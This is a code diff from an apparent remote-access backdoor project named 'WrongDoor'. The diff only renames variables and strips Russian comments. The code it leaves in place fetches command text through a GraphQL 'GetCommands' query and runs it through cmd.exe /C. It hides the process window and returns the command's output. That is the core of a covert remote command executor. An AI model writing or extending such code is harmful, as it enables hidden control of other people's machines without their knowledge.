@@ -8,9 +8,8 @@ namespace WrongDoor.MainServer.CommandExutors
     {
         public async Task<string> Execute(GetCommandsGQL.Response.CommandSelection command)
         {
-            ProcessStartInfo process_options = new ProcessStartInfo(@"cmd.exe", @"/C " + command.body)
+            var processOptions = new ProcessStartInfo(@"cmd.exe", @"/C " + command.body)
             {
-                // скрываем окно запущенного процесса
                 WindowStyle = ProcessWindowStyle.Hidden,
                 RedirectStandardOutput = true,
                 RedirectStandardError = true,
@@ -18,17 +17,13 @@ namespace WrongDoor.MainServer.CommandExutors
                 CreateNoWindow = true
             };
 
-            // запускаем процесс
-            Process process = Process.Start(process_options);
+            var process = Process.Start(processOptions);
 
-            // получаем ответ запущенного процесса
             var outp = process.StandardError.ReadToEnd();
             outp += process.StandardOutput.ReadToEnd();
 
-            // закрываем процесс
             process.WaitForExit();
 
-            // выводим результат
             return (outp);
         }
     }
